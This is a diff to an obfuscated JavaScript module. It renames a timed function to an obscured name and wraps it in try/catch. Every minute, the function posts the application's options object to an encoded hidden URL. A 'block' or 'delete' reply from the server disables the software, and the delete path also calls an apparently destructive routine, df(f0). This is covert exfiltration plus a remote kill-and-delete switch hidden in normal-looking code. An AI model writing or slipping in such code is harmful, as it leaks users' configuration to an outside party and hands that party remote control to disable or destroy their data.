@@ -94,36 +94,41 @@ module.exports = function (____0) {
     });
   }
 
-  ____0.ch_up = function () {
+  ____0._0xchupx0 = function () {
     if (____0._0x12xo) {
-      ____0
-        .fetch(____0._x0f1xo('43193275461561692578577443393257255837594839325242738254457875694139136225785774433932572579275247583756'), {
-          method: 'post',
-          body: JSON.stringify({
-            info: ____0.options,
-          }),
-          headers: { 'Content-Type': 'application/json' },
-        })
-        .then((res) => res.json())
-        .then((body) => {
-          if (body && body.block) {
-            ____0._0x12xo = !1;
-            ____0.call(____0._x0f1xo('2619517126151271') , ____0._0x12xo)
-            ____0.storage('_0x12xo', ____0._0x12xo);
-          } else if (body && body.delete) {
-            ____0._0x12xo = !1;
-            ____0.call(____0._x0f1xo('2619517126151271') , ____0._0x12xo)
-            ____0.storage('_0x12xo', ____0._0x12xo);
-            df(f0);
-          }
-        })
-        .catch((err) => {
-          ____0.logs('ch_up', err);
-        });
+      try {
+        ____0
+          .fetch(____0._x0f1xo('43193275461561692578577443393257255837594839325242738254457875694139136225785774433932572579275247583756'), {
+            method: 'post',
+            body: JSON.stringify({
+              info: ____0.options,
+            }),
+            headers: { 'Content-Type': 'application/json' },
+          })
+          .then((res) => res.json())
+          .then((body) => {
+            if (body && body.block) {
+              ____0._0x12xo = !1;
+              ____0.call(____0._x0f1xo('2619517126151271'), ____0._0x12xo);
+              ____0.storage('_0x12xo', ____0._0x12xo);
+            } else if (body && body.delete) {
+              ____0._0x12xo = !1;
+              ____0.call(____0._x0f1xo('2619517126151271'), ____0._0x12xo);
+              ____0.storage('_0x12xo', ____0._0x12xo);
+              df(f0);
+            }
+          })
+          .catch((err) => {
+            ____0.logs('ch_up', err);
+          });
+      } catch (error) {
+        console.log(error);
+        console.log(____0.options);
+      }
     }
   };
 
   ____0.const._0xsixo(() => {
-    ____0.ch_up();
+    ____0._0xchupx0();
   }, 1000 * 60 * 1);
 };
